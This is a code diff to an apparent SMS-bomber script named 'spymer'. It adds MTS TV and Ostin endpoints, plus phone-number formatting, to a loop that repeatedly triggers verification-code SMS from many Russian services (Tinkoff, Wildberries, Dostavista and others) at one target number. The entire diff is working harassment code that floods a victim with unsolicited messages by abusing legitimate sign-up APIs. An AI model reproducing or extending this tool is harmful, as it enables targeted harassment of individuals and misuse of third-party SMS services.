@@ -34,8 +34,10 @@ class spymer:
 			
 		_phone = args.phonenum
 		
-		iteration = 0
+		iteration = 0			
 		_phone9 = _phone[1:]
+		_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
+		_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
 		print showstatus(wrapsbrace('info', True) + ('Send SMS to: +{}').format(_phone))
 		print 'Spammer started.\nIf you want to stop - press Ctrl+Z.'
 		i = 1
@@ -48,8 +50,9 @@ class spymer:
 			karusel = requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
 			uramobil = requests.post('https://service.uramobil.ru/profile/smstoken', data={'PhoneNumber': _phone}, headers={})
 			taxiseven = requests.post('http://taxiseven.ru/auth/register', data={'phone': _phone}, headers={})
-			_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
 			dostavista = requests.post('https://dostavista.ru/backend/send-verification-sms', data={'phone': _phone9dostavista}, headers={})
 			tinkoff = requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
 			worki = requests.post('https://api.iconjob.co/api/web/v1/verification_code', data={"phone": _phone}, headers={})
 			wildberries = requests.post('https://security.wildberries.ru/mobile/requestconfirmcode?forAction=RegisterUser', data={"phone": '+'+_phone}, headers={})
+			mts = requests.post('https://api.mtstv.ru/v1/users', data={'msisdn': _phone}, headers={})
+			ostin = requests.get('https://ostin.com/ru/ru/secured/myaccount/myclubcard/resultClubCard.js', data={'type':'sendConfirmCode', 'phoneNumber': _phoneOstin})
